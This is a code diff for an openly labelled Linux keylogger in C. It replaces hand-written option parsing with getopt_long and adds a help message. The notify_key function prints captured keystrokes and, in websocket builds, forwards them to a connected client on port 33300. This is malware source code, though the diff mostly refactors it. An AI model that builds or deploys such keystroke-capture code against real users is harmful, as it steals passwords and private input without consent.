@@ -1,4 +1,5 @@
 #include <fcntl.h>
+#include <getopt.h>
 #include <signal.h>
 #include <stdlib.h>
 #include <string.h>
@@ -15,28 +16,66 @@
 static volatile sig_atomic_t keep_running = true;
 static bool printk_active = false;
 
-void notify_key(const char *key);
-void signal_handler();
+void notify_key(const char *key) {
+    if (strcmp(key, "SKIP") == 0) return;
+    if (printk_active) printf("%s\n", key);
+#ifdef USE_LIBWEBSOCKETS
+    send_message_to_client(key);
+#endif
+}
 
-int main(int argc, const char *argv[]) {
+void print_help() {
+    printf("\n");
+    printf("Keylogger for Linux. Leaks your keyboard input\n");
+    printf("\n");
+    printf("Usage   : keylogger <options?>\n");
+    printf("Options :\n");
+    printf("  --dev <path>     Specify the device event to use\n");
+    printf("  --printk         Show keystrokes in terminal\n");
+    printf("  --port <uint16>  Specify websocket port\n");
+    printf("\n");
+    printf("  -h, --help       Display help message\n");
+    printf("\n");
+}
+
+void signal_handler() { keep_running = false; }
+
+int main(int argc, char *argv[]) {
     const char *target_device_name = NULL;
 #ifdef USE_LIBWEBSOCKETS
     uint16_t port = 33300;
 #endif
-    for (int i = 1; i < argc; i++) {
-        // Device option
-        if (strcmp(argv[i], "--dev") == 0 && i + 1 < argc) {
-            target_device_name = argv[i + 1];
-            // Print key option
-        } else if (strcmp(argv[i], "--printk") == 0) {
-            printk_active = true;
-            // Websocket option
-        }
+
+    struct option keylogger_options[] = {
+        {"dev",    required_argument, NULL, 0  },
 #ifdef USE_LIBWEBSOCKETS
-        else if (strcmp(argv[i], "--port") == 0 && i + 1 < argc) {
-            port = (uint16_t)atoi(argv[i + 1]);
-        }
+        {"port",   required_argument, NULL, 0  },
 #endif
+        {"printk", no_argument,       NULL, 0  },
+        {"help",   no_argument,       NULL, 'h'},
+        {0,        0,                 0,    0  }
+    };
+
+    int opt;
+    int opt_index = 0;
+    while ((opt = getopt_long(argc, argv, "h", keylogger_options, &opt_index)) != -1) {
+        switch (opt) {
+            case 'h':
+                print_help();
+                return EXIT_SUCCESS;
+            case 0:
+                if (opt_index == 0) target_device_name = optarg;
+#ifdef USE_LIBWEBSOCKETS
+                if (opt_index == 1) port = (uint16_t)atoi(optarg);
+                if (opt_index == 2) printk_active = true;
+#else
+                if (opt_index == 1) printk_active = true;
+#endif
+                break;
+            default:
+                printf("Unknown option. Use -h or --help for help\n");
+                return EXIT_FAILURE;
+        }
     }
 
     char *keyboard_path = find_keyboard_device(target_device_name);
@@ -175,17 +214,3 @@ int main(int argc, const char *argv[]) {
 
     return EXIT_SUCCESS;
 }
-
-void notify_key(const char *key) {
-    if (strcmp(key, "SKIP") == 0) {
-        return;
-    }
-    if (printk_active) {
-        printf("%s\n", key);
-    }
-#ifdef USE_LIBWEBSOCKETS
-    send_message_to_client(key);
-#endif
-}
-
-void signal_handler() { keep_running = false; }
